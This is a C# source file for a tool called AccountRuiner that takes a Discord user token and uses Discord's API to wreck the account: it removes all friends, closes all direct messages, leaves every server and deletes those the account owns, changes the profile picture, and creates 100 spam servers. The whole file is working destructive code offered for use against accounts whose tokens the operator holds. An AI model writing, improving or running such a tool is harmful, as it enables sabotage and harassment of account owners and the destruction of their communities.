using System;
using Leaf.xNet;
using System.Text;
using System.Drawing;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace AccountRuiner
{
    class Ruiner
    {
        private string token { get; set; }
        private string username { get; set; }
        private static string pic { get; set; }
        private static string serverName { get; set; }

        public Ruiner(string tkn, string img, string srvName)
        {
            token = tkn;
            pic = img;
            serverName = srvName;
            CheckToken();
        }

        private static LoadImage img = new LoadImage
        {
            image = pic == "" ? Image.FromFile(pic) : null
        };

        private CreateServer cs = new CreateServer
        {
            name = serverName,
            icon = img.ToString() != null ? img.ToString() : null
        };

        Settings settings = new Settings
        {
            avatar = img.ToString() != null ? img.ToString() : null
        };
        
        private void CheckToken()
        {
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.AddHeader("authorization", token);
                    string resp = req.Get("https://discord.com/api/v8/users/@me").ToString();
                    var jsonResp = JObject.Parse(resp);
                    username = $"{jsonResp["username"]}#{jsonResp["discriminator"]}";
                }
            }
            catch (HttpException ex)
            {
                if(ex.HttpStatusCode == HttpStatusCode.Unauthorized)
                {
                    Console.WriteLine("Token isn't working. Press any key to exit.");
                    Console.ReadKey();
                    Environment.Exit(1);
                }
            }
            Console.WriteLine($"\nLogged in as: {username}");
            Console.WriteLine("Ruining will start.");

            Ruin();
        }

        private void RemoveFriendship()
        {
            using (HttpRequest req = new HttpRequest())
            {
                req.AddHeader("authorization", token);
                string resp = req.Get("https://discord.com/api/v8/users/@me/relationships").ToString();
                if(resp != "[]")
                {
                    var jsonResp = JArray.Parse(resp);

                    for(int i = 0; i < jsonResp.Count; i++)
                    {
                        try
                        {
                            ulong id = ulong.Parse(jsonResp[i]["id"].ToString());
                            string friendUsername = $"{jsonResp[i]["user"]["username"]}#{jsonResp[i]["user"]["discriminator"]}";

                            req.AddHeader("authorization", token);
                            var resp1 = req.Delete($"https://discord.com/api/v8/users/@me/relationships/{id}");
                            if (resp1.StatusCode == HttpStatusCode.NoContent)
                            {
                                Console.WriteLine($"Friendship removed with: {friendUsername}!");
                            }
                            else
                            {
                                Console.WriteLine($"Friendship not removed with: {friendUsername}");
                            }
                        }
                        catch (HttpException) { Console.WriteLine("Something went wrong"); }
                    }
                }
            }
        }

        private void CloseDM()
        {
            using (HttpRequest req = new HttpRequest())
            {
                req.AddHeader("authorization", token);
                string resp = req.Get("https://discordapp.com/api/v8/users/@me/channels").ToString();
                if(resp != "[]")
                {
                    var jsonResp = JArray.Parse(resp);
                    for (int i = 0; i < jsonResp.Count; i++)
                    {
                        try
                        {
                            string friendUsername;
                            ulong id = ulong.Parse(jsonResp[i]["id"].ToString());
                            try
                            {
                                friendUsername = $"{jsonResp[i]["recipients"][0]["username"]}#{jsonResp[i]["recipients"][0]["discriminator"]}";
                            }
                            catch (Exception) { friendUsername = "Something went wrong"; }

                            req.AddHeader("authorization", token);
                            var resp1 = req.Delete($"https://discord.com/api/v8/channels/{id}");
                            if (resp1.StatusCode == HttpStatusCode.OK)
                            {
                                if(friendUsername == "Something went wrong")
                                    Console.WriteLine($"{friendUsername}");
                                else
                                    Console.WriteLine($"DM closed with: {friendUsername}!");
                            }
                            else
                            {
                                Console.WriteLine($"DM not closed with: {friendUsername}");
                            }
                        }
                        catch (HttpException) { Console.WriteLine("Something went wrong"); }
                    }
                }
            }
        }

        private void ChangePfp()
        {
            using(HttpRequest req = new HttpRequest())
            {
                req.AddHeader("authorization", token);
                string resp = req.Get("https://discord.com/api/v8/users/@me").ToString();
                var jsonResp = JObject.Parse(resp);
                settings.email = jsonResp["email"].ToString();
                settings.username = jsonResp["username"].ToString();

                string breh = JsonConvert.SerializeObject(settings);

                var payload = new StringContent(JsonConvert.SerializeObject(settings), Encoding.UTF8)
                {
                    ContentType = "application/json"
                };

                try
                {
                    req.AddHeader("authorization", token);
                    var resp1 = req.Patch("https://discord.com/api/v8/users/@me", payload);
                    if(resp1.StatusCode == HttpStatusCode.OK)
                    {
                        Console.WriteLine("Profile pic changed!");
                    }
                    else
                    {
                        Console.WriteLine("Profile not pic changed");
                    }
                }
                catch (HttpException) { Console.WriteLine("Something went wrong"); }
            }
        }

        private void LeaveServers()
        {
            using (HttpRequest req = new HttpRequest())
            {
                req.AddHeader("authorization", token);
                string resp = req.Get("https://discord.com/api/v8/users/@me/guilds").ToString();
                if(resp != "[]")
                {
                    var jsonResp = JArray.Parse(resp);
                    for (int i = 0; i < jsonResp.Count; i++)
                    {
                        try
                        {
                            ulong id = ulong.Parse(jsonResp[i]["id"].ToString());
                            string name = jsonResp[i]["name"].ToString();
                            bool owner = bool.Parse(jsonResp[i]["owner"].ToString());

                            if (!owner)
                            {
                                req.AddHeader("authorization", token);
                                var resp1 = req.Delete($"https://discord.com/api/v8/users/@me/guilds/{id}");
                                if (resp1.StatusCode == HttpStatusCode.NoContent)
                                {
                                    Console.WriteLine($"Left server: {name}!");
                                }
                                else
                                {
                                    Console.WriteLine($"Didn't left server: {name}");
                                }
                            }
                            else
                            {
                                req.AddHeader("authorization", token);
                                var resp1 = req.Delete($"https://discord.com/api/v8/guilds/{id}");
                                if (resp1.StatusCode == HttpStatusCode.NoContent)
                                {
                                    Console.WriteLine($"Delete server: {name}!");
                                }
                                else
                                {
                                    Console.WriteLine($"Didn't delete server: {name}");
                                }
                            }
                        }
                        catch (HttpException) { Console.WriteLine("Something went wrong"); }
                    }
                }
            }
        }

        private void MakeServers()
        {
            using(HttpRequest req = new HttpRequest())
            {
                req.AddHeader("authorization", token);

                var payload = new StringContent(JsonConvert.SerializeObject(cs), Encoding.UTF8)
                {
                    ContentType = "application/json"
                };

                for (int i = 0; i < 100; i++)
                {
                    try
                    {
                        req.AddHeader("authorization", token);
                        var resp = req.Post("https://discord.com/api/v8/guilds", payload);
                        if (resp.StatusCode == HttpStatusCode.Created)
                        {
                            Console.WriteLine($"Created server!");
                        }
                        else
                        {
                            Console.WriteLine($"Didn't create server");
                        }
                    }
                    catch (HttpException) { Console.WriteLine("Something went wrong"); }
                }
            }
        }

        public void Ruin()
        {
            if (pic != "")
                ChangePfp();
            RemoveFriendship();
            CloseDM();
            LeaveServers();
            MakeServers();
        }
    }
}
